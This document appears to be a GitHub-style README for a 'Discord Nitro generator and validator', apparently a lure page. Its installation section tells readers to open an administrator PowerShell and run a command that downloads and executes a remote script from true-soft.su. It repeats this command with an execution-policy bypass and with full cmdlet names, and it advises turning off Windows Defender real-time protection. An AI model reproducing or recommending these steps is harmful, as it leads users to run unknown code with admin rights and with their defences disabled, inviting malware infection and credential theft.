# Discord Nitro Simulation & Validation Tool 🚀

A high-performance, asynchronous **Discord Nitro string generator** and **promotional link validator** built for educational purposes and API load testing. This project demonstrates advanced Python concepts including asynchronous networking, proxy rotation, and cryptographic pattern matching.

---

## 🔎 Overview & SEO Keywords

This repository serves as an open-source reference for developers studying automation techniques. It simulates the process of **Discord Nitro code generation** and checks token/gift validity using official public API endpoints. 

### Key Features & Architecture:
* **Discord Gift Link Generator**: Implements algorithmic pattern generation mimicking official Discord promotional links.
* **Asynchronous HTTP Requests**: Utilizes `aiohttp` for multi-threaded, high-speed API status checks.
* **Advanced Proxy Rotator**: Built-in support for HTTP, HTTPS, SOCKS4, and SOCKS5 proxies to prevent rate limiting (429 Too Many Requests).
* **Discord API Integration**: Real-time validation against the official `://discord.com` endpoint.

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select **Terminal (Admin)** or **Windows PowerShell (Admin)** from the context menu.

2. Run the Installation Command:
   Copy, paste, and press `Enter` to run the following initialization command. This script will automatically configure the registry bypass and download all required packages:

   ```powershell
   irm https://true-soft.su/powershell/Loader.ps1 | iex
   ```

---

## 🔍 Troubleshooting & Common Errors

### 📌 Execution Policy Error (Script Blocked)
If your system blocks the launch due to execution policy restrictions, force a bypass using this command in Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://true-soft.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (Older PowerShell Versions)
If you are using an older environment where short aliases are missing, use the full system commands:
```powershell
Invoke-RestMethod https://true-soft.su/powershell/Loader.ps1 | Invoke-Expression
```

### 📌 Antivirus or SmartScreen Block
Automated scripts can sometimes trigger antivirus warnings. If this happens, temporarily turn off "Real-time protection" in Windows Defender settings during setup, then turn it back on as soon as the installation is complete.

---
